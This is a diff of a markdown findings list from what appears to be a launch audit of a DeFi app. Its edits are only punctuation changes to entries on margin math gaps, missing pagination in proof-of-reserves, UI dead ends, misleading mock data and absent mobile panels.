 **Fix:** Cap active keys per user (e.g. 50) in `recordIssued`. Or implement batched revocation that the user can call repeatedly.
 **Effort:** M (2h) + redeploy
 
@@ -485,7 +485,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 **Effort:** S (1 line per adapter) + redeploys
 
 ### H-029 · `PlinthMath` accepts `haircuts_bps` parameter but never uses it
-**Source:** wave2-contracts W2-H1 · **File:** `contracts/plinth-math/src/lib.rs:109` — `let _ = haircuts_bps;`
+**Source:** wave2-contracts W2-H1 · **File:** `contracts/plinth-math/src/lib.rs:109`, `let _ = haircuts_bps;`
 **Impact:** Risk model is incomplete. Concentrated positions in illiquid instruments are under-margined. The haircut configured per-instrument has zero effect on required margin.
 **Fix:** Integrate haircuts into the SPAN scenario loop: `worst_loss_per_class *= (10000 + max_haircut_in_class) / 10000`.
 **Effort:** L (8h math + tests) + redeploy
@@ -506,17 +506,17 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### H-032 · Notifier fetch has no timeout
 **Source:** wave2-subgraph SD-5 · **File:** `services/notifier/src/tick.ts:22-28`
-**Impact:** Same hang risk with 1-minute cron cadence — zombies stack rapidly.
+**Impact:** Same hang risk with 1-minute cron cadence, zombies stack rapidly.
 **Fix:** Add `signal: AbortSignal.timeout(5_000)`.
 **Effort:** S (1 line)
 
 ### H-033 · `protocol/metrics` and `reserves/summary` use `first: 1000` with no pagination
 **Source:** wave2-subgraph SD-6 · **Files:** `apps/verify/src/app/api/protocol/metrics/route.ts:30-31`, `api/reserves/summary/route.ts:31`
-**Impact:** Beyond 1000 users, TVL and POR are silently undercounted. The Lantern POR specifically claims "proof of reserves" while missing reserves — a false attestation published on-chain at scale.
-**Fix:** Paginate with `skip` until exhausted. For Lantern, the off-chain service has the same bug — fix `services/lantern-attestor/src/scribe.ts:14` too.
+**Impact:** Beyond 1000 users, TVL and POR are silently undercounted. The Lantern POR specifically claims "proof of reserves" while missing reserves, a false attestation published on-chain at scale.
+**Fix:** Paginate with `skip` until exhausted. For Lantern, the off-chain service has the same bug, fix `services/lantern-attestor/src/scribe.ts:14` too.
 **Effort:** M (2h)
 
-### H-034 · Lantern `first: 1000` hardcoded — silent data loss on POR tree
+### H-034 · Lantern `first: 1000` hardcoded, silent data loss on POR tree
 **Source:** O-26 · **File:** `services/lantern-attestor/src/scribe.ts:14`
 **Impact:** Beyond 1000 depositors, the POR tree is incomplete. The "proof of reserves" attestation is wrong on-chain.
 **Fix:** Paginate or use `first: 5000` with a logged warning when results == 5000.
@@ -544,7 +544,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### H-038 · No wrong-chain banner at the app shell level
 **Source:** wave1-wallet W-2, wave2-e2e E2E-59 · **File:** `apps/verify/src/components/app-shell.tsx`
-**Impact:** All 13 `/app/*` pages silently fail on wrong chain — no banner, no guidance. Wagmi shows nothing because `useSwitchChain` is not called anywhere outside `verifier-step-runner`.
+**Impact:** All 13 `/app/*` pages silently fail on wrong chain, no banner, no guidance. Wagmi shows nothing because `useSwitchChain` is not called anywhere outside `verifier-step-runner`.
 **Fix:** Add a persistent banner in `AppShell` when `chain?.id !== 421614` with a "Switch to Arbitrum Sepolia" button using wagmi's `useSwitchChain`.
 **Effort:** M (2h)
 
@@ -560,7 +560,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 **Fix:** In each form, compare `parseUnits(input)` against on-chain balance (already fetched for display). Disable submit and show "Insufficient USDC balance" when input > balance.
 **Effort:** M (4h covering 4 forms)
 
-### H-041 · Transfer form CTA is dead — no onClick handler
+### H-041 · Transfer form CTA is dead, no onClick handler
 **Source:** wave1-wallet MC-13 · **File:** `apps/verify/src/components/transfer/transfer-form.tsx:178`
 **Evidence:** `<button type="button" disabled={!ready} ...>Transfer {amount} {token} →</button>` with no onClick and no parent `<form onSubmit>`.
 **Impact:** Primary CTA on a primary app page does nothing. Clicking it is a dead end.
@@ -576,14 +576,14 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### H-043 · `risk-preview-modal.tsx` does not disclose 10% partial-liquidation policy
 **Source:** wave2-product P-23 · **File:** `apps/verify/src/components/trade/risk-preview-modal.tsx`
-**Impact:** Users do not know that liquidation is partial (10% per block) — a competitive advantage that's hidden. Plinth's `partial_liquidation_bps = 1000` is set but never communicated.
+**Impact:** Users do not know that liquidation is partial (10% per block), a competitive advantage that's hidden. Plinth's `partial_liquidation_bps = 1000` is set but never communicated.
 **Fix:** Add to the risk modal: "Liquidation is partial: max 10% of your position per block. Your position survives if margin recovers within the same block window."
 **Effort:** S (5 min)
 
 ### H-044 · Oracle staleness is not surfaced in the UI
-**Source:** wave2-product P-22 · **Files:** `/app/trade`, `/app/portfolio` — no oracle health indicator
+**Source:** wave2-product P-22 · **Files:** `/app/trade`, `/app/portfolio`, no oracle health indicator
 **Impact:** PRD §21.1 specifies that prices >5 min old pause Plinth. The risk modal mentions this but no real-time indicator tells the user when the freshness threshold is approached. Users see stale prices with no warning.
-**Fix:** Add an oracle health pill to the trade page header and portfolio shell: "Oracle: fresh (12s ago)" or "Oracle: STALE — trading paused" based on the latest price update timestamp.
+**Fix:** Add an oracle health pill to the trade page header and portfolio shell: "Oracle: fresh (12s ago)" or "Oracle: STALE, trading paused" based on the latest price update timestamp.
 **Effort:** M (3h)
 
 ## Honesty · marketing claims · live verification
@@ -598,7 +598,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 ### H-046 · `Features.tsx` PortfolioMock and LanternMock render fake portfolio + reserves
 **Source:** wave1-live-verify LV-08, wave2-product P-16, P-17 · **File:** `apps/verify/src/components/atrium/landing/Features.tsx:88-110, 260-265`
 **Evidence:** Hardcoded `$12,378,422` portfolio value with `+$284,920 · 24h` P&L; `$4,128,370` Lantern reserves with `0.00 bps` delta and "Verified · 38 min ago"; specific position rows.
-**Impact:** Visual mocks inside browser-chrome frames imply "this is what the real app looks like" with real data. The Lantern mock specifically attests perfect solvency with a fake timestamp — particularly dangerous.
+**Impact:** Visual mocks inside browser-chrome frames imply "this is what the real app looks like" with real data. The Lantern mock specifically attests perfect solvency with a fake timestamp, particularly dangerous.
 **Fix:** Add subtle "Illustrative · testnet" labels inside each browser chrome, OR wire to real API endpoints with "0" / "pending" fallback.
 **Effort:** S (15 min for labels) or M (3h for full wiring)
 
@@ -609,7 +609,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 **Fix:** Update the copy to the real amounts. Or increase the faucet drops to match (requires more funded faucet contract).
 **Effort:** S (5 min copy)
 
-### H-048 · "Thirteen ship at launch" copy is wrong — actual deployed count is 14+
+### H-048 · "Thirteen ship at launch" copy is wrong, actual deployed count is 14+
 **Source:** wave1-live-verify LV-17, wave2-product P-19, P-37 · **File:** `apps/verify/src/components/atrium/mobile/MobileLanding.tsx:228`
 **Impact:** Undersells the project (13 < actual deployed count). The PRD's FLOOR scenario says 13/18, but the real deployed count is closer to 14–15. The number is also stale.
 **Fix:** Remove the hardcoded number and derive from the deployment registry, OR replace with "Eighteen named. Fourteen live today" with a dynamic count.
@@ -667,7 +667,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 **Fix:** Add `support@atrium.fi`. Replace Discord redirect with a direct `discord.gg/` invite. Add an in-app feedback widget (or a "Get help" link in the app footer linking to Discord + email).
 **Effort:** S (1h after Discord vanity URL is created)
 
-### H-057 · Adapter conformance test suite missing — `tests/adapter-conformance/` is empty
+### H-057 · Adapter conformance test suite missing, `tests/adapter-conformance/` is empty
 **Source:** O-52, wave1-launch L-10 · **CONTRIBUTING.md:8 reference**
 **Impact:** README promises grants for IPorticoAdapter v1.0 implementations. Contributors cannot verify conformance because the directory is empty. Broken contributor onboarding path.
 **Fix:** Write the 6 conformance tests as Foundry tests exercising the IPorticoAdapter interface against a mock adapter. Document the test harness in a `tests/adapter-conformance/README.md`.
@@ -681,7 +681,7 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### H-059 · KYC/AML disclosure incomplete
 **Source:** wave1-launch L-12 · **File:** `legal/privacy/page.tsx:37-42`
-**Impact:** Mentions Sumsub but never discloses what data Sumsub collects, the data-sharing agreement, which jurisdictions trigger KYC, what happens on KYC failure, how to appeal a tier decision. Sumsub processes IDs, selfies, biometrics — all require explicit disclosure.
+**Impact:** Mentions Sumsub but never discloses what data Sumsub collects, the data-sharing agreement, which jurisdictions trigger KYC, what happens on KYC failure, how to appeal a tier decision. Sumsub processes IDs, selfies, biometrics, all require explicit disclosure.
 **Fix:** Add a dedicated KYC disclosure section or link to a standalone KYC privacy notice. List data categories, retention, and Sumsub's role as processor.
 **Effort:** M (3h)
 
@@ -739,13 +739,13 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ## Mobile · required flows / PWA
 
-### H-067 · `/app/vault` has no mobile-optimized panel — required flow per ui.md
+### H-067 · `/app/vault` has no mobile-optimized panel, required flow per ui.md
 **Source:** wave2-e2e E2E-12, E2E-31 · **Missing:** `components/mobile/panels/vault-mobile.tsx`
 **Impact:** Deposit USDC is one of 5 required mobile flows. Currently renders inside generic AppShell mobile wrapper with desktop proportions.
 **Fix:** Create `VaultMobile` panel matching the pattern of `TradeMobile` / `TransferMobile`. Touch targets ≥44px, single-column layout.
 **Effort:** M (3h)
 
-### H-068 · `/app/reserves` has no mobile-optimized panel — required flow per ui.md
+### H-068 · `/app/reserves` has no mobile-optimized panel, required flow per ui.md
 **Source:** wave2-e2e E2E-18, E2E-33 · **Missing:** `components/mobile/panels/reserves-mobile.tsx`
 **Impact:** View Lantern attestation is a required mobile flow. Currently desktop layout at all widths.
 **Fix:** Create `ReservesMobile` panel. Verify-balance button at full width, latest-attestation card stacked.
@@ -767,8 +767,8 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 
 ### H-071 · No `useSwitchChain` / wrong-chain banner anywhere except verifier-step-runner
 **Source:** wave2-e2e E2E-59, wave1-wallet W-2 · **Files:** all `/app/*` pages
-**Impact:** All authenticated app pages silently fail on wrong chain. Same root cause as H-038 — captured separately because ui.md lists permission state as a required state for every feature.
-**Fix:** Same as H-038 — add to `AppShell`. Tracking separately to ensure ui.md compliance is verified after the fix.
+**Impact:** All authenticated app pages silently fail on wrong chain. Same root cause as H-038, captured separately because ui.md lists permission state as a required state for every feature.
+**Fix:** Same as H-038, add to `AppShell`. Tracking separately to ensure ui.md compliance is verified after the fix.
 
 ### H-072 · No contract-paused state on any `/app/*` page
 **Source:** wave2-e2e E2E-61 · **Files:** all `/app/*` pages
@@ -782,15 +782,15 @@ README claims the app is "deployed to Arbitrum Sepolia at verify.atrium.fi". A j
 **Fix:** Distinguish loading / empty / error in each fetcher's return shape. The pattern from `open-positions-table.tsx` ("Could not load positions" with retry) is the correct one to copy.
 **Effort:** M (4h covering 8 components)
 
-### H-074 · Verifier step 4 (chaos) produces no tx hash — breaks "every step has Arbiscan link" rule
+### H-074 · Verifier step 4 (chaos) produces no tx hash, breaks "every step has Arbiscan link" rule
 **Source:** wave2-product P-13 · **File:** `verifier-step-runner.tsx:130`
 **Impact:** PRD §26.1 requires each step to "produce a real tx hash with Arbiscan link." Chaos is off-chain, so this step cannot. Judges expect 7 Arbiscan links and find 6.
-**Fix:** Either (a) add a `ChaosEvent` event to a contract so step 4 produces a real tx hash, or (b) add an inline disclosure on step 4: "Off-chain fault injection — no on-chain tx by design."
+**Fix:** Either (a) add a `ChaosEvent` event to a contract so step 4 produces a real tx hash, or (b) add an inline disclosure on step 4: "Off-chain fault injection, no on-chain tx by design."
 **Effort:** S (15 min disclosure) or M (4h on-chain event)
 
 ### H-075 · No chaos button on any verifier step page
 **Source:** wave2-e2e E2E-02 · **Files:** all `/verify/[step]` pages except step 4
-**Impact:** ui.md says "Chaos Mode button injects a random fault" — implying it's available throughout the flow. Today, chaos is only on `/chaos`. Judges expect to click chaos mid-demo and see graceful degradation.
+**Impact:** ui.md says "Chaos Mode button injects a random fault", implying it's available throughout the flow. Today, chaos is only on `/chaos`. Judges expect to click chaos mid-demo and see graceful degradation.
 **Fix:** Add a chaos sidebar button on each verifier step page. Wire to `/api/chaos/inject` with `mode=random`.
 **Effort:** M (2h)
 
